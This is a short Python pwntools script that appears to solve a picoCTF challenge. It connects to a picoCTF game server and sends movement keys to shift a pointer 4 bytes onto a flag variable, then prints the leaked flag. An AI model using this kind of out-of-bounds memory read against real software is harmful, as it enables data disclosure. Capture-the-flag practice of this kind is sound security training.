from pwn import *

conn = "saturn.picoctf.net 53210"
host = conn.split(" ")[0]
port = conn.split(" ")[1]

p = remote(host, port)

for i in range(4):
    p.sendline(b"w")
    p.sendline(b"a")

# offset 4 byte the var flag
for i in range(4):
    p.sendline(b"a")

p.sendline(b"p")
f = p.recvall()

print("picoCTF" + f.decode().split("picoCTF")[1])
